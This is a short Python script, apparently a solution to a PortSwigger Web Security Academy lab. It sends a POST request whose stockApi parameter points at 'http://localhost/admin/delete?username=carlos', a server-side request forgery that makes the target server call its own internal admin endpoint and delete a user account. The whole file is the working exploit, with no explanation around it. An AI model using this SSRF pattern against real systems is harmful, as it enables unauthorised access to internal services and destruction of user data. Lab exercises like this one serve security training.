import requests 

url = "https://0af800d704f9d9f681ce572600f40083.web-security-academy.net/product/stock"

params = {"stockApi": "http://localhost/admin/delete?username=carlos"}

response = requests.post(url, data=params)

print(response.text)